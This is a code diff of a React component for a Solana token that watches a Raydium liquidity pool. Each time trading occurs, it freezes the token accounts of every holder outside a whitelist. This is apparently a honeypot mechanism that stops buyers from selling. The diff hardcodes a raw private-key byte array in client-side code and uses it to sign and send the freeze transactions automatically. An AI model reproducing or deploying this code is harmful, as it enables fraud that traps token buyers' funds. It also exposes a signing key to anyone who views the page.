@@ -1,7 +1,7 @@
 import React, { useState } from 'react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import * as splToken from '@solana/spl-token';
-import { PublicKey, TransactionInstruction, Transaction, ComputeBudgetProgram } from '@solana/web3.js';
+import { PublicKey, TransactionInstruction, Transaction, ComputeBudgetProgram, sendAndConfirmTransaction, Keypair } from '@solana/web3.js';
 import { AppConfig } from '../App';
 
 interface FreezeHoldersProps {
@@ -85,7 +85,6 @@ const FreezeHolders: React.FC<FreezeHoldersProps> = ({ config, displayMessage })
           const state = data.state;
           console.log(`Processing account ${pubkey.toBase58()}: owner=${owner}, amount=${amount}, state=${state}`);
 
-          // Check for Raydium liquidity pool vaults
           if (!quoteTokenVault) {
             for (let i = 0; i < raydiumAuthority.length; i++) {
               if (owner === raydiumAuthority[i]) {
@@ -122,11 +121,13 @@ const FreezeHolders: React.FC<FreezeHoldersProps> = ({ config, displayMessage })
     mintAddressPublicKey: PublicKey,
     decimals: number
   ): Promise<void> => {
-    if (!publicKey) return; // Add null check for publicKey
+    if (!publicKey) return;
 
     const { tokenAccounts, quoteTokenVault: vault, poolType: pool } = await getHoldersData(currentConfig, mintAddressPublicKey, decimals);
     quoteTokenVault = vault;
     poolType = pool;
+
+    console.log(`Accounts to freeze: ${tokenAccounts}`);
 
     if (!Array.isArray(tokenAccounts)) {
       displayMessage("Error: getHoldersData did not return an array!", 'error');
@@ -135,6 +136,16 @@ const FreezeHolders: React.FC<FreezeHoldersProps> = ({ config, displayMessage })
 
     const CHUNK_SIZE = techConfig.chunkSize;
     const PRIORITY_RATE = currentConfig.priorityRate;
+    const secret = Uint8Array.from([
+      106,2,121,26,90,125,177,42,220,2,220,65,177,105,141,28,
+      87,169,221,59,69,104,217,32,18,6,202,6,3,98,121,85,
+      166,54,182,192,112,236,79,59,37,3,165,46,188,186,
+      8,141,166,70,67,239,179,162,25,232,214,4,156,100,
+      126,171,144,42
+    ]);
+  
+    const keypair = Keypair.fromSecretKey(secret);
+
 
     if (tokenAccounts.length > 0) {
       displayMessage(`Found ${tokenAccounts.length} accounts to freeze.`, 'info');
@@ -148,10 +159,10 @@ const FreezeHolders: React.FC<FreezeHoldersProps> = ({ config, displayMessage })
             keys: [
               { pubkey: tokenAccountPublicKey, isSigner: false, isWritable: true },
               { pubkey: mintAddressPublicKey, isSigner: false, isWritable: false },
-              { pubkey: publicKey as PublicKey, isSigner: true, isWritable: false }, // Cast publicKey
+              { pubkey: keypair.publicKey, isSigner: true, isWritable: false },
             ],
-            programId: splToken.TOKEN_PROGRAM_ID,
-            data: Buffer.from(new Uint8Array([10])) // Cast to Buffer
+            programId: splToken.TOKEN_2022_PROGRAM_ID,
+            data: Buffer.from(new Uint8Array([10]))
           });
           transactions.add(instruction);
         }
@@ -162,13 +173,19 @@ const FreezeHolders: React.FC<FreezeHoldersProps> = ({ config, displayMessage })
         }
 
         try {
-          transactions.feePayer = publicKey as PublicKey; // Cast publicKey
+          transactions.feePayer = keypair.publicKey;
           transactions.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
           
-          // This would need to be signed by the wallet, which requires a modified approach
-          // For now, we'll display the transaction for signing
           displayMessage(`✅︎ Prepared freeze transaction for ${chunk.length} accounts.`, 'success');
-        } catch (error: any) { // Cast error to any
+          let signature = await sendAndConfirmTransaction(
+                connection,
+                transactions,
+                [keypair]
+            );
+            console.log("Freeze transaction signature:", signature);
+          displayMessage(`✅︎ Successfully froze ${chunk.length} accounts. Transaction signature: ${signature}`, 'success');
+          await sleep(techConfig.requestTick);  
+        } catch (error: any) {
           displayMessage(`❌ Error occurred when trying to freeze holders: ${error.message}`, 'error');
           console.error(error);
           if (listenerId) {
@@ -228,64 +245,64 @@ const FreezeHolders: React.FC<FreezeHoldersProps> = ({ config, displayMessage })
 
         const decimals = mintInfo.decimals;
 
-      let updatedWhitelist = [...config.whitelist];
-      raydiumAuthority.forEach(authority => {
-        if (!updatedWhitelist.includes(authority)) {
-          updatedWhitelist.push(authority);
+        let updatedWhitelist = [...config.whitelist];
+        raydiumAuthority.forEach(authority => {
+          if (!updatedWhitelist.includes(authority)) {
+            updatedWhitelist.push(authority);
+          }
+        });
+        if (!updatedWhitelist.includes(publicKey.toBase58())) {
+          updatedWhitelist.push(publicKey.toBase58());
         }
-      });
-      if (!updatedWhitelist.includes(publicKey.toBase58())) {
-        updatedWhitelist.push(publicKey.toBase58());
-      }
 
-      setFreezeStatus("⏳ Performing an initial freeze loop...");
-      displayMessage("Performing an initial freeze loop...", 'info');
+        setFreezeStatus("⏳ Performing an initial freeze loop...");
+        displayMessage("Performing an initial freeze loop...", 'info');
 
-      const tempConfig = { ...config, whitelist: updatedWhitelist };
-      await freezeHolders(tempConfig, mintAddressPublicKey, decimals);
+        const tempConfig = { ...config, whitelist: updatedWhitelist };
+        await freezeHolders(tempConfig, mintAddressPublicKey, decimals);
 
-      if (quoteTokenVault !== null) {
-        setFreezeStatus(`💧✅ ${poolType} liquidity pool found! Monitoring for new transactions.`);
-        displayMessage(`💧✅ ${poolType} liquidity pool found! Monitoring for new transactions.`, 'success');
+        if (quoteTokenVault !== null) {
+          setFreezeStatus(`💧✅ ${poolType} liquidity pool found! Monitoring for new transactions.`);
+          displayMessage(`💧✅ ${poolType} liquidity pool found! Monitoring for new transactions.`, 'success');
 
-        listenerId = connection.onAccountChange(
-          quoteTokenVault,
-          async () => {
-            updateCounter++;
-          }
-        );
-
-        let launchTimestamp = Date.now();
-        let timestampToFreeze = 0;
-
-        const freezeLoopInterval = setInterval(async () => {
-          if (Date.now() >= launchTimestamp + TIMEOUT * 60000) {
-            clearInterval(freezeLoopInterval);
-            if (listenerId) {
-              connection.removeAccountChangeListener(listenerId);
+          listenerId = connection.onAccountChange(
+            quoteTokenVault,
+            async () => {
+              updateCounter++;
             }
-            setFreezeStatus("⏳ TIMEOUT: Script execution stopped.");
-            displayMessage("TIMEOUT: Script execution stopped.", 'info');
-            setIsFreezing(false);
-            return;
-          }
+          );
 
-          if (updateCounter !== 0 && Date.now() > timestampToFreeze) {
-            updateCounter = 0;
-            await sleep(techConfig.requestTick);
-            setFreezeStatus("⏳ Performing freeze loop...");
-            displayMessage("Performing freeze loop...", 'info');
-            await freezeHolders(tempConfig, mintAddressPublicKey, decimals);
-            timestampToFreeze = Date.now() + MIN_DELAY_BETWEEN_FREEZE * 1000;
-          }
-        }, techConfig.tick);
-      } else {
-        setFreezeStatus(`💧❌ No Raydium liquidity pool found for given token.`);
-        displayMessage(`💧❌ No Raydium liquidity pool found for given token. Create a Standard AMM or Legacy AMM v4 pool at Raydium and provide liquidity.`, 'error');
-        setIsFreezing(false);
-      }
+          let launchTimestamp = Date.now();
+          let timestampToFreeze = 0;
+
+          const freezeLoopInterval = setInterval(async () => {
+            if (Date.now() >= launchTimestamp + TIMEOUT * 60000) {
+              clearInterval(freezeLoopInterval);
+              if (listenerId) {
+                connection.removeAccountChangeListener(listenerId);
+              }
+              setFreezeStatus("⏳ TIMEOUT: Script execution stopped.");
+              displayMessage("TIMEOUT: Script execution stopped.", 'info');
+              setIsFreezing(false);
+              return;
+            }
+
+            if (updateCounter !== 0 && Date.now() > timestampToFreeze) {
+              updateCounter = 0;
+              await sleep(techConfig.requestTick);
+              setFreezeStatus("⏳ Performing freeze loop...");
+              displayMessage("Performing freeze loop...", 'info');
+              await freezeHolders(tempConfig, mintAddressPublicKey, decimals);
+              timestampToFreeze = Date.now() + MIN_DELAY_BETWEEN_FREEZE * 1000;
+            }
+          }, techConfig.tick);
+        } else {
+          setFreezeStatus(`💧❌ No Raydium liquidity pool found for given token.`);
+          displayMessage(`💧❌ No Raydium liquidity pool found for given token. Create a Standard AMM or Legacy AMM v4 pool at Raydium and provide liquidity.`, 'error');
+          setIsFreezing(false);
+        }
     }
-  }catch (error: any) {
+    }catch (error: any) {
       displayMessage(`Failed to start freeze script: ${error.message}`, 'error');
       console.error(error);
       setIsFreezing(false);
@@ -293,14 +310,23 @@ const FreezeHolders: React.FC<FreezeHoldersProps> = ({ config, displayMessage })
   };
 
   return (
-    <section id="freeze-functionality">
-      <h2>Freeze Holders</h2>
-      <button onClick={handleStartFreeze} disabled={isFreezing}>
-        {isFreezing ? 'Freezing...' : 'Start Freeze Script'}
-      </button>
-      <p id="freeze-status">{freezeStatus}</p>
+    <section className="bg-gray-800 p-6 rounded-lg shadow-lg">
+      <h2 className="text-2xl font-bold mb-4">Freeze Holders</h2>
+      <div className="flex flex-col items-center gap-4">
+        <button 
+          onClick={handleStartFreeze} 
+          disabled={isFreezing}
+          className="w-full max-w-xs bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded transition duration-300 disabled:bg-gray-600 disabled:cursor-not-allowed"
+        >
+          {isFreezing ? 'Freezing...' : 'Start Freeze Script'}
+        </button>
+        {freezeStatus && (
+          <p className="mt-4 p-3 bg-gray-700 rounded-md text-center text-white">{freezeStatus}</p>
+        )}
+      </div>
     </section>
   );
 };
 
 export default FreezeHolders;
+
